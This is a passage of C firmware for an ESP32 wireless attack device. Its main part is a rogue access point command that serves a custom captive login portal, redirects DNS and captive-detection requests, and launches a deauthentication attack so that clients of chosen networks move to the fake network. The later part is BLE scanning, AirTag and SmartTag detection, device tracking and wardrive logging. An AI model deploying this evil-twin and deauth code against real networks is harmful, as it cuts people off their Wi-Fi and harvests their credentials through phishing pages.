    // Set portal as active (must be before starting DNS task)
    portal_active = true;
    MY_LOG_INFO(TAG, "Portal marked as active");
    
    // Start DNS server task
    BaseType_t task_ret = xTaskCreate(
        dns_server_task,
        "dns_server",
        4096,
        NULL,
        5,
        &dns_server_task_handle
    );
    
    if (task_ret != pdPASS) {
        portal_active = false;
        httpd_stop(portal_server);
        portal_server = NULL;
        esp_wifi_stop();
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Captive portal started successfully!");
    MY_LOG_INFO(TAG, "AP Name: %s", ssid);
    MY_LOG_INFO(TAG, "Connect to '%s' WiFi network to access the portal", ssid);

    esp_err_t led_err = led_set_color(255, 0, 255); // Purple for portal mode
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for portal mode: %s", esp_err_to_name(led_err));
    }
    
    return 0;
}

// Start password-protected rogue AP with captive portal and optional deauth
static int cmd_start_rogueap(int argc, char **argv) {
    oled_display_update_full("> Rogue AP",
        argc >= 2 ? argv[1] : "  No SSID",
        "  WPA2 + Portal", "  Active...");
    rogueap_mode_active = true;
    log_memory_info("start_rogueap");
    
    // Validate arguments
    if (argc < 3) {
        MY_LOG_INFO(TAG, "Usage: start_rogueap <SSID> <password>");
        MY_LOG_INFO(TAG, "Example: start_rogueap MyNetwork MyPassword123");
        return 1;
    }
    
    const char *ssid = argv[1];
    const char *password = argv[2];
    size_t ssid_len = strlen(ssid);
    size_t password_len = strlen(password);
    
    // Validate SSID length (WiFi SSID max is 32 characters)
    if (ssid_len == 0 || ssid_len > 32) {
        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
        return 1;
    }
    
    // Validate password length (WPA2 requires 8-63 characters)
    if (password_len < 8 || password_len > 63) {
        MY_LOG_INFO(TAG, "Password length must be between 8 and 63 characters for WPA2");
        return 1;
    }
    
    // Check if custom HTML is selected via select_html
    if (custom_portal_html == NULL) {
        MY_LOG_INFO(TAG, "No custom HTML selected. Use 'select_html' command first.");
        MY_LOG_INFO(TAG, "Example: list_html, then select_html <number>");
        return 1;
    }
    
    // Check if portal is already running
    if (portal_active) {
        MY_LOG_INFO(TAG, "Portal already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Check if deauth attack is already running
    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        MY_LOG_INFO(TAG, "Failed to initialize WiFi");
        return 1;
    }
    
    // Reset stop flag
    operation_stop_requested = false;
    
    MY_LOG_INFO(TAG, "Starting Rogue AP with SSID: %s (WPA2 protected)", ssid);
    
    // If networks are selected, prepare for deauth
    bool deauth_enabled = (g_selected_count > 0);
    if (deauth_enabled) {
        MY_LOG_INFO(TAG, "Networks selected: %d - deauth attack will run alongside portal", g_selected_count);
        applicationState = DEAUTH_EVIL_TWIN;  // Same state as evil twin for channel parking
    } else {
        MY_LOG_INFO(TAG, "No networks selected - portal only mode (no deauth)");
        // Keep IDLE state - portal_active flag handles the portal functionality
    }
    
    // Store portal SSID for logging purposes
    if (portalSSID != NULL) {
        free(portalSSID);
    }
    portalSSID = malloc(ssid_len + 1);
    if (portalSSID != NULL) {
        strcpy(portalSSID, ssid);
    }
    
    // Enable AP mode and get AP netif
    esp_netif_t *ap_netif = ensure_ap_mode();
    if (!ap_netif) {
        MY_LOG_INFO(TAG, "Failed to enable AP mode");
        applicationState = IDLE;
        return 1;
    }
    
    // Stop DHCP server to configure custom IP
    esp_netif_dhcps_stop(ap_netif);
    
    // Set static IP 172.0.0.1 for AP
    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    
    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
        applicationState = IDLE;
        return 1;
    }
    
    MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
    
    // Configure AP with WPA2-PSK authentication
    wifi_config_t ap_config = {0};
    memcpy(ap_config.ap.ssid, ssid, ssid_len);
    ap_config.ap.ssid_len = ssid_len;
    strncpy((char*)ap_config.ap.password, password, sizeof(ap_config.ap.password) - 1);
    ap_config.ap.max_connection = 4;
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    
    // Use first selected network's channel if available, otherwise channel 1
    if (deauth_enabled && target_bssid_count > 0) {
        ap_config.ap.channel = target_bssids[0].channel;
        MY_LOG_INFO(TAG, "Using channel %d from first selected network", ap_config.ap.channel);
    } else if (deauth_enabled && g_selected_count > 0) {
        // target_bssids not yet saved, get from scan results
        int idx = g_selected_indices[0];
        ap_config.ap.channel = g_scan_results[idx].primary;
        MY_LOG_INFO(TAG, "Using channel %d from first selected network", ap_config.ap.channel);
    } else {
        ap_config.ap.channel = 1;
    }
    
    // AP mode already enabled by ensure_ap_mode(), just configure it
    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
        applicationState = IDLE;
        return 1;
    }
    
    // Start DHCP server
    ret = esp_netif_dhcps_start(ap_netif);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
        applicationState = IDLE;
        return 1;
    }
    
    // Wait a bit for AP to fully start
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    // Configure HTTP server
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_open_sockets = 7;
    
    // Start HTTP server
    esp_err_t http_ret = httpd_start(&portal_server, &config);
    if (http_ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
        esp_netif_dhcps_stop(ap_netif);
        applicationState = IDLE;
        return 1;
    }
    
    MY_LOG_INFO(TAG, "HTTP server started successfully on port 80");
    
    // Register URI handlers (same as start_portal)
    httpd_uri_t root_uri = {
        .uri = "/",
        .method = HTTP_GET,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_uri);
    
    httpd_uri_t root_post_uri = {
        .uri = "/",
        .method = HTTP_POST,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_post_uri);
    
    httpd_uri_t portal_uri = {
        .uri = "/portal",
        .method = HTTP_GET,
        .handler = portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &portal_uri);
    
    httpd_uri_t login_uri = {
        .uri = "/login",
        .method = HTTP_POST,
        .handler = login_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &login_uri);
    
    httpd_uri_t get_uri = {
        .uri = "/get",
        .method = HTTP_GET,
        .handler = get_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &get_uri);
    
    httpd_uri_t save_uri = {
        .uri = "/save",
        .method = HTTP_POST,
        .handler = save_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &save_uri);
    
    httpd_uri_t android_captive_uri = {
        .uri = "/generate_204",
        .method = HTTP_GET,
        .handler = android_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &android_captive_uri);
    
    httpd_uri_t ios_captive_uri = {
        .uri = "/hotspot-detect.html",
        .method = HTTP_GET,
        .handler = ios_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &ios_captive_uri);
    
    httpd_uri_t samsung_captive_uri = {
        .uri = "/ncsi.txt",
        .method = HTTP_GET,
        .handler = captive_detection_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &samsung_captive_uri);
    
    httpd_uri_t captive_uri = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = captive_portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_uri);
    
    httpd_uri_t captive_api_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_GET,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_uri);
    
    httpd_uri_t captive_api_post_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_POST,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_post_uri);
    
    httpd_uri_t captive_api_options_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_OPTIONS,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_options_uri);
    
    // Set portal as active (must be before starting DNS task)
    portal_active = true;
    MY_LOG_INFO(TAG, "Portal marked as active");
    
    // Start DNS server task
    BaseType_t task_ret = xTaskCreate(
        dns_server_task,
        "dns_server",
        4096,
        NULL,
        5,
        &dns_server_task_handle
    );
    
    if (task_ret != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create DNS server task");
        portal_active = false;
        httpd_stop(portal_server);
        portal_server = NULL;
        esp_netif_dhcps_stop(ap_netif);
        applicationState = IDLE;
        return 1;
    }
    
    // If networks are selected, start deauth attack
    if (deauth_enabled) {
        // Save target BSSIDs for channel monitoring
        save_target_bssids();
        last_channel_check_time = esp_timer_get_time() / 1000; // Convert to milliseconds
        
        MY_LOG_INFO(TAG, "Starting deauth attack on %d network(s):", g_selected_count);
        for (int i = 0; i < target_bssid_count; i++) {
            MY_LOG_INFO(TAG, "  [%d] %02X:%02X:%02X:%02X:%02X:%02X (CH %d)",
                        i + 1,
                        target_bssids[i].bssid[0], target_bssids[i].bssid[1],
                        target_bssids[i].bssid[2], target_bssids[i].bssid[3],
                        target_bssids[i].bssid[4], target_bssids[i].bssid[5],
                        target_bssids[i].channel);
        }
        
        // Start deauth attack in background task
        deauth_attack_active = true;
        BaseType_t result = xTaskCreate(
            deauth_attack_task,
            "deauth_task",
            4096,
            NULL,
            5,
            &deauth_attack_task_handle
        );
        
        if (result != pdPASS) {
            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
            deauth_attack_active = false;
            // Portal is still running, so don't fail completely
            MY_LOG_INFO(TAG, "WARNING: Portal running but deauth attack failed to start");
        }
    }
    
    MY_LOG_INFO(TAG, "Rogue AP started successfully!");
    MY_LOG_INFO(TAG, "AP Name: %s (WPA2 protected)", ssid);
    MY_LOG_INFO(TAG, "Password: %s", password);
    MY_LOG_INFO(TAG, "Custom HTML loaded (%zu bytes)", strlen(custom_portal_html));
    MY_LOG_INFO(TAG, "Connect to '%s' WiFi network to access the captive portal", ssid);
    
    esp_err_t led_err = led_set_color(255, 165, 0); // Orange for rogue AP mode
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for rogue AP mode: %s", esp_err_to_name(led_err));
    }
    
    return 0;
}

// ============================================================================
// BLE Scanner Functions (NimBLE)
// ============================================================================

/**
 * Check if BLE device was already found (for deduplication)
 */
static bool bt_is_device_found(const uint8_t *addr)
{
    for (int i = 0; i < bt_found_device_count; i++) {
        if (memcmp(bt_found_devices[i], addr, 6) == 0) {
            return true;
        }
    }
    return false;
}

/**
 * Find device index by MAC address in bt_devices array
 * Returns -1 if not found
 */
static int bt_find_device_index(const uint8_t *addr)
{
    for (int i = 0; i < bt_device_count; i++) {
        if (memcmp(bt_devices[i].addr, addr, 6) == 0) {
            return i;
        }
    }
    return -1;
}

static bool bt_grow_storage_if_needed(int required_count)
{
    if (required_count <= bt_device_capacity && required_count <= bt_found_device_capacity) {
        return true;
    }

    int new_capacity = bt_device_capacity > bt_found_device_capacity ? bt_device_capacity : bt_found_device_capacity;
    if (new_capacity <= 0) {
        new_capacity = BT_INITIAL_CAPACITY;
    }
    while (new_capacity < required_count) {
        new_capacity *= 2;
    }

    uint8_t (*new_found_devices)[6] = heap_caps_calloc(new_capacity, sizeof(*bt_found_devices), MALLOC_CAP_SPIRAM);
    if (!new_found_devices) {
        MY_LOG_INFO(TAG, "Failed to grow BLE dedup buffer to %d entries", new_capacity);
        return false;
    }

    bt_device_info_t *new_bt_devices = heap_caps_calloc(new_capacity, sizeof(bt_device_info_t), MALLOC_CAP_SPIRAM);
    if (!new_bt_devices) {
        free(new_found_devices);
        MY_LOG_INFO(TAG, "Failed to grow BLE device buffer to %d entries", new_capacity);
        return false;
    }

    if (bt_found_devices && bt_found_device_count > 0) {
        memcpy(new_found_devices, bt_found_devices,
               (size_t)bt_found_device_count * sizeof(*bt_found_devices));
    }
    if (bt_devices && bt_device_count > 0) {
        memcpy(new_bt_devices, bt_devices,
               (size_t)bt_device_count * sizeof(bt_device_info_t));
    }

    free(bt_found_devices);
    free(bt_devices);
    bt_found_devices = new_found_devices;
    bt_devices = new_bt_devices;
    bt_found_device_capacity = new_capacity;
    bt_device_capacity = new_capacity;
    MY_LOG_INFO(TAG, "BLE device buffers grown to %d entries", new_capacity);
    return true;
}

/**
 * Add BLE device to found list
 */
static bool bt_add_found_device(const uint8_t *addr)
{
    if (!bt_grow_storage_if_needed(bt_found_device_count + 1)) {
        return false;
    }
    memcpy(bt_found_devices[bt_found_device_count], addr, 6);
    bt_found_device_count++;
    return true;
}

/**
 * Reset BLE scan counters
 */
static void bt_reset_counters(void)
{
    bt_airtag_count = 0;
    bt_smarttag_count = 0;
    bt_found_device_count = 0;
    bt_device_count = 0;
    if (bt_found_devices && bt_found_device_capacity > 0) {
        memset(bt_found_devices, 0, (size_t)bt_found_device_capacity * sizeof(*bt_found_devices));
    }
    if (bt_devices && bt_device_capacity > 0) {
        memset(bt_devices, 0, (size_t)bt_device_capacity * sizeof(bt_device_info_t));
    }
}

/**
 * Format BLE MAC address to string
 */
static void bt_format_addr(const uint8_t *addr, char *str)
{
    sprintf(str, "%02X:%02X:%02X:%02X:%02X:%02X",
            addr[5], addr[4], addr[3], addr[2], addr[1], addr[0]);
}

static int wigle_wifi_channel_to_frequency_mhz(int channel)
{
    if (channel == 14) {
        return 2484;
    }
    if (channel >= 1 && channel <= 13) {
        return 2407 + (channel * 5);
    }
    if (channel >= 32 && channel <= 177) {
        return 5000 + (channel * 5);
    }
    return 0;
}

static double gps_distance_meters(double lat1, double lon1, double lat2, double lon2)
{
    const double earth_radius_m = 6371000.0;
    const double deg_to_rad = 0.017453292519943295;
    double dlat = (lat2 - lat1) * deg_to_rad;
    double dlon = (lon2 - lon1) * deg_to_rad;
    double a_lat1 = lat1 * deg_to_rad;
    double a_lat2 = lat2 * deg_to_rad;
    double sin_dlat = sin(dlat / 2.0);
    double sin_dlon = sin(dlon / 2.0);
    double a = sin_dlat * sin_dlat +
               cos(a_lat1) * cos(a_lat2) * sin_dlon * sin_dlon;
    double c = 2.0 * atan2(sqrt(a), sqrt(1.0 - a));
    return earth_radius_m * c;
}

static bool wardrive_trace_init_file(const char *path)
{
    FILE *file = fopen(path, "w");
    if (!file) {
        return false;
    }

    fprintf(file, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
    fprintf(file, "<kml xmlns=\"http://www.opengis.net/kml/2.2\">\n");
    fprintf(file, "<Document>\n");
    fprintf(file, "  <name>Wardrive Promisc Trace</name>\n");
    fprintf(file, "  <Style id=\"traceLine\">\n");
    fprintf(file, "    <LineStyle><color>ff00ffff</color><width>4</width></LineStyle>\n");
    fprintf(file, "  </Style>\n");
    fprintf(file, "  <Placemark>\n");
    fprintf(file, "    <name>Wardrive Trace</name>\n");
    fprintf(file, "    <styleUrl>#traceLine</styleUrl>\n");
    fprintf(file, "    <LineString>\n");
    fprintf(file, "      <tessellate>1</tessellate>\n");
    fprintf(file, "      <coordinates>\n");
    fclose(file);
    return true;
}

static bool wardrive_trace_append_point(const char *path, double lat, double lon, double alt)
{
    FILE *file = fopen(path, "a");
    if (!file) {
        return false;
    }
    fprintf(file, "        %.7f,%.7f,%.2f\n", lon, lat, alt);
    fclose(file);
    return true;
}

static void wardrive_trace_finalize_file(const char *path)
{
    FILE *file = fopen(path, "a");
    if (!file) {
        return;
    }
    fprintf(file, "      </coordinates>\n");
    fprintf(file, "    </LineString>\n");
    fprintf(file, "  </Placemark>\n");
    fprintf(file, "</Document>\n");
    fprintf(file, "</kml>\n");
    fclose(file);
}

/**
 * Parse MAC address string to bytes (format: XX:XX:XX:XX:XX:XX)
 * Returns true if parsing successful
 */
static bool bt_parse_mac(const char *str, uint8_t *mac)
{
    unsigned int values[6];
    if (sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        // Try lowercase
        if (sscanf(str, "%02x:%02x:%02x:%02x:%02x:%02x",
                   &values[0], &values[1], &values[2],
                   &values[3], &values[4], &values[5]) != 6) {
            return false;
        }
    }
    
    // Store in reverse order (BLE format)
    for (int i = 0; i < 6; i++) {
        mac[5 - i] = (uint8_t)values[i];
    }
    
    return true;
}

/**
 * Check if raw BLE payload contains Apple AirTag/Find My patterns
 * Uses Marauder's method: scan raw payload for specific byte sequences
 * Detects both original AirTags and clones (Mi-Tag, etc.)
 */
static bool bt_is_airtag_payload(const uint8_t *payload, size_t len)
{
    if (len < 4) return false;
    
    // Scan payload for Marauder patterns
    for (size_t i = 0; i + 4 <= len; i++) {
        // Pattern 1: 0x1E 0xFF 0x4C 0x00 (len=30, mfg type, Apple ID)
        if (payload[i] == 0x1E && payload[i+1] == 0xFF && 
            payload[i+2] == 0x4C && payload[i+3] == 0x00) {
            return true;
        }
        // Pattern 2: 0x4C 0x00 0x12 0x19 (Apple ID, Find My type, len=25)
        if (payload[i] == 0x4C && payload[i+1] == 0x00 && 
            payload[i+2] == 0x12 && payload[i+3] == 0x19) {
            return true;
        }
    }
    return false;
}

/**
 * Check if manufacturer data indicates Samsung SmartTag
 * SmartTag uses specific device type bytes (0x02/0x03) in SmartThings Find protocol
 * This avoids false positives from Samsung phones
 */
static bool bt_is_samsung_smarttag(const uint8_t *data, uint8_t len)
{
    if (len < 4) return false;
    
    // Check Company ID (Little Endian: 0x75 0x00)
    uint16_t company_id = data[0] | (data[1] << 8);
    if (company_id != SAMSUNG_COMPANY_ID) return false;
    
    // SmartTag uses SmartThings Find protocol
    // Device type byte (byte 2) should be 0x02 or 0x03 for SmartTag/SmartTag+
    // Samsung phones use different type values
    uint8_t device_type = data[2];
    
    // SmartTag typical payload length is 22-28 bytes
    if ((device_type == 0x02 || device_type == 0x03) && len >= 20 && len <= 30) {
        return true;
    }
    
    return false;
}

/**
 * BLE GAP event callback for scanning
 */
static int bt_gap_event_callback(struct ble_gap_event *event, void *arg)
{
    if (event->type != BLE_GAP_EVENT_DISC) {
        return 0;
    }
    
    struct ble_gap_disc_desc *desc = &event->disc;
    
    // MAC tracking mode - update RSSI and name for tracked device
    if (bt_tracking_mode) {
        if (memcmp(desc->addr.val, bt_tracking_mac, 6) == 0) {
            bt_tracking_rssi = desc->rssi;
            bt_tracking_found = true;
            
            // Try to extract name if we don't have one yet
            if (bt_tracking_name[0] == '\0') {
                struct ble_hs_adv_fields fields;
                if (ble_hs_adv_parse_fields(&fields, desc->data, desc->length_data) == 0) {
                    if (fields.name != NULL && fields.name_len > 0) {
                        int name_len = fields.name_len < 31 ? fields.name_len : 31;
                        memcpy(bt_tracking_name, fields.name, name_len);
                        bt_tracking_name[name_len] = '\0';
                    }
                }
            }
        }
        return 0;
    }
    
    // Parse advertising data
    struct ble_hs_adv_fields fields;
    int rc = ble_hs_adv_parse_fields(&fields, desc->data, desc->length_data);
    if (rc != 0) {
        return 0;
    }
    
    // Check if this is a Scan Response packet (contains names more often)
    bool is_scan_response = (desc->event_type == BLE_HCI_ADV_RPT_EVTYPE_SCAN_RSP);
    
    // Check if device already seen
    bool already_seen = bt_is_device_found(desc->addr.val);
    
    // If already seen, only process scan responses to update names
    if (already_seen) {
        // Try to update name from scan response if we don't have one
        if (is_scan_response && fields.name != NULL && fields.name_len > 0) {
            int dev_idx = bt_find_device_index(desc->addr.val);
            if (dev_idx >= 0 && bt_devices[dev_idx].name[0] == '\0') {
                int name_len = fields.name_len < 31 ? fields.name_len : 31;
                memcpy(bt_devices[dev_idx].name, fields.name, name_len);
                bt_devices[dev_idx].name[name_len] = '\0';
            }
        }
        return 0;
    }
    
    // Add to found devices list
    if (!bt_add_found_device(desc->addr.val)) {
        return 0;
    }
    
    // Store device info
    if (!bt_grow_storage_if_needed(bt_device_count + 1)) {
        return 0;
    }
    bt_device_info_t *dev = &bt_devices[bt_device_count];
    memcpy(dev->addr, desc->addr.val, 6);
    dev->rssi = desc->rssi;
    dev->name[0] = '\0';
    dev->company_id = 0;
    dev->is_airtag = false;
    dev->is_smarttag = false;
    
    // Extract device name if available (standard AD field)
    bool has_name = (fields.name != NULL && fields.name_len > 0);
    if (has_name) {
        int name_len = fields.name_len < 31 ? fields.name_len : 31;
        memcpy(dev->name, fields.name, name_len);
        dev->name[name_len] = '\0';
    }
    
    // Check for AirTag using raw payload (Marauder method)
    if (bt_is_airtag_payload(desc->data, desc->length_data)) {
        dev->is_airtag = true;
        bt_airtag_count++;
    }
    
    // Check manufacturer data for SmartTag and company ID
    if (fields.mfg_data != NULL && fields.mfg_data_len >= 2) {
        dev->company_id = fields.mfg_data[0] | (fields.mfg_data[1] << 8);
        
        if (!dev->is_airtag && bt_is_samsung_smarttag(fields.mfg_data, fields.mfg_data_len)) {
            dev->is_smarttag = true;
            bt_smarttag_count++;
        }
    }
    
    bt_device_count++;
    
    return 0;
}

/**
 * Start BLE scanning - full duty cycle (for dedicated BT scan commands)
 */
static int bt_start_scan(void)
{
    struct ble_gap_disc_params scan_params = {
        .itvl = 0x60,             // 60ms interval (0x60 * 0.625ms)
        .window = 0x60,           // 60ms window = continuous listening
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0,
        .passive = 0,             // ACTIVE scan - critical for Scan Response names
        .filter_duplicates = 0,   // We handle duplicates ourselves
    };

    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &scan_params,
                          bt_gap_event_callback, NULL);
    return rc;
}

/**
 * Start BLE scanning with reduced duty cycle for WiFi coexistence.
 * Uses ~25% duty cycle (40ms window / 160ms interval) so the shared
 * ESP32-C5 radio spends most of its time on WiFi promiscuous capture.
 */
static int bt_start_scan_coex(void)
{
    struct ble_gap_disc_params scan_params = {
        .itvl = 0x100,            // 160ms interval (0x100 * 0.625ms)
        .window = 0x40,           // 40ms window  -> ~25% duty cycle
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0,
        .passive = 0,
        .filter_duplicates = 0,
    };

    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, BLE_HS_FOREVER, &scan_params,
                          bt_gap_event_callback, NULL);
    return rc;
}

/**
 * Stop BLE scanning
 */
static void bt_stop_scan(void)
{
    ble_gap_disc_cancel();
}

/**
 * NimBLE host sync callback
 */
static void bt_on_sync(void)
{
    ESP_LOGI(TAG, "BLE Host synchronized");
    nimble_initialized = true;
}

/**
 * NimBLE host reset callback
 */
static void bt_on_reset(int reason)
{
    ESP_LOGE(TAG, "BLE Host reset, reason: %d", reason);
    nimble_initialized = false;
}

/**
 * NimBLE host task
 */
static void nimble_host_task(void *param)
{
    ESP_LOGI(TAG, "NimBLE host task started");
    nimble_port_run();
    nimble_port_freertos_deinit();
}

/**
 * Initialize NimBLE stack (called once)
 */
static esp_err_t bt_nimble_init(void)
{
    if (nimble_initialized) {
        return ESP_OK;
    }
    
    esp_err_t ret = nimble_port_init();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "NimBLE port init failed: %d", ret);
        return ret;
    }
    
    // Configure BLE host callbacks
    ble_hs_cfg.sync_cb = bt_on_sync;
    ble_hs_cfg.reset_cb = bt_on_reset;
    
    // Start NimBLE host task
    nimble_port_freertos_init(nimble_host_task);
    
    // Wait for sync (max 3 seconds)
    for (int i = 0; i < 30 && !nimble_initialized; i++) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    if (!nimble_initialized) {
        ESP_LOGE(TAG, "NimBLE failed to sync");
        return ESP_FAIL;
    }
    
    return ESP_OK;
}

/**
 * Deinitialize NimBLE stack
 */
static void bt_nimble_deinit(void)
{
    if (!nimble_initialized) {
        return;
    }
    
    // Stop any active scanning
    bt_scan_active = false;
    bt_airtag_scan_active = false;
    bt_stop_scan();
    
    // Wait for scan task to finish
    if (bt_scan_task_handle != NULL) {
        for (int i = 0; i < 20 && bt_scan_task_handle != NULL; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
    
    // Stop NimBLE host task
    nimble_port_stop();
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // Deinitialize NimBLE port and controller (required for reinit)
    nimble_port_deinit();
    
    nimble_initialized = false;
    MY_LOG_INFO(TAG, "NimBLE stopped");
}

/**
 * Stop BLE scanner (called from cmd_stop)
 */
static void bt_scan_stop(void)
{
    if (!bt_scan_active && !bt_airtag_scan_active && bt_scan_task_handle == NULL) {
        return;
    }
    
    bt_scan_active = false;
    bt_airtag_scan_active = false;
    bt_stop_scan();
    
    // Wait for task to finish
    for (int i = 0; i < 40 && bt_scan_task_handle != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    if (bt_scan_task_handle != NULL) {
        vTaskDelete(bt_scan_task_handle);
        bt_scan_task_handle = NULL;
    }
    
    MY_LOG_INFO(TAG, "BLE scanner stopped.");
}

/**
 * Task for one-time BLE scan (scan_bt command)
 */
static void bt_scan_task(void *pvParameters)
{
    bt_reset_counters();
    
    MY_LOG_INFO(TAG, "BLE scan starting (10 seconds)...");
    
    int rc = bt_start_scan();
    if (rc != 0) {
        MY_LOG_INFO(TAG, "BLE scan start failed: %d", rc);
        bt_scan_active = false;
        bt_scan_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Scan for 10 seconds with light blue LED blinking
    bool led_on = false;
    for (int i = 0; i < 100 && bt_scan_active; i++) {
        // Toggle LED every 500ms (every 5 iterations)
        if (i % 5 == 0) {
            led_on = !led_on;
            if (led_on) {
                led_set_color(100, 200, 255); // Light blue
            } else {
                led_clear();
            }
        }
        if (i % 10 == 0) {
            char ble_l2[64], ble_l3[64], ble_l4[64];
            snprintf(ble_l2, sizeof(ble_l2), "  Scanning %d/10s", i / 10);
            snprintf(ble_l3, sizeof(ble_l3), "  %d devices", bt_device_count);
            snprintf(ble_l4, sizeof(ble_l4), "  AT:%d ST:%d", bt_airtag_count, bt_smarttag_count);
            oled_display_update_full("> BLE Scan", ble_l2, ble_l3, ble_l4);
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    // Restore idle LED
    led_set_idle();
    
    bt_stop_scan();
    bt_scan_active = false;
    
    {
        char ble_l3[64], ble_l4[64];
        snprintf(ble_l3, sizeof(ble_l3), "  %d devices", bt_device_count);
        snprintf(ble_l4, sizeof(ble_l4), "  AT:%d ST:%d", bt_airtag_count, bt_smarttag_count);
        oled_display_update_full("> BLE Scan", "  Scan done!", ble_l3, ble_l4);
    }
    
    // Print results
    MY_LOG_INFO(TAG, "");
    MY_LOG_INFO(TAG, "=== BLE Scan Results ===");
    MY_LOG_INFO(TAG, "Found %d devices:", bt_device_count);
    MY_LOG_INFO(TAG, "");
    
    for (int i = 0; i < bt_device_count; i++) {
        bt_device_info_t *dev = &bt_devices[i];
        char addr_str[18];
        bt_format_addr(dev->addr, addr_str);
        
        char type_str[32] = "";
        if (dev->is_airtag) {
            strcpy(type_str, " [AirTag]");
        } else if (dev->is_smarttag) {
            strcpy(type_str, " [SmartTag]");
        }
        
        if (dev->name[0] != '\0') {
            MY_LOG_INFO(TAG, "%3d. %s  RSSI: %d dBm  Name: %s%s", 
                       i + 1, addr_str, dev->rssi, dev->name, type_str);
        } else {
            MY_LOG_INFO(TAG, "%3d. %s  RSSI: %d dBm%s", 
                       i + 1, addr_str, dev->rssi, type_str);
        }
    }
    
    MY_LOG_INFO(TAG, "");
    MY_LOG_INFO(TAG, "Summary: %d AirTags, %d SmartTags, %d total devices",
               bt_airtag_count, bt_smarttag_count, bt_device_count);
    
    bt_scan_task_handle = NULL;
    vTaskDelete(NULL);
}

/**
 * Task for continuous AirTag scan (scan_airtag command)
 */
static void bt_airtag_scan_task(void *pvParameters)
{
    MY_LOG_INFO(TAG, "AirTag scanner starting (continuous)...");
    MY_LOG_INFO(TAG, "Output format: <airtag_count>,<smarttag_count>");
    MY_LOG_INFO(TAG, "Use 'stop' command to stop scanning.");
    MY_LOG_INFO(TAG, "");
    
    int at_cycle = 0;
    
    while (bt_airtag_scan_active && !operation_stop_requested) {
        bt_reset_counters();
        at_cycle++;
        
        int rc = bt_start_scan();
        if (rc != 0) {
            MY_LOG_INFO(TAG, "BLE scan start failed: %d", rc);
            break;
        }
        
        // Scan for 10 seconds with light blue LED blinking
        bool led_on = false;
        for (int i = 0; i < 100 && bt_airtag_scan_active && !operation_stop_requested; i++) {
            // Toggle LED every 500ms (every 5 iterations)
            if (i % 5 == 0) {
                led_on = !led_on;
                if (led_on) {
                    led_set_color(100, 200, 255); // Light blue
                } else {
                    led_clear();
                }
            }
            if (i % 20 == 0) {
                char at_l2[64], at_l4[64];
                snprintf(at_l2, sizeof(at_l2), "  Cycle #%d", at_cycle);
                snprintf(at_l4, sizeof(at_l4), "  AT:%d ST:%d", bt_airtag_count, bt_smarttag_count);
                oled_display_update_full("> AirTag Scan", at_l2, "  Scanning...", at_l4);
            }
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        
        bt_stop_scan();
        
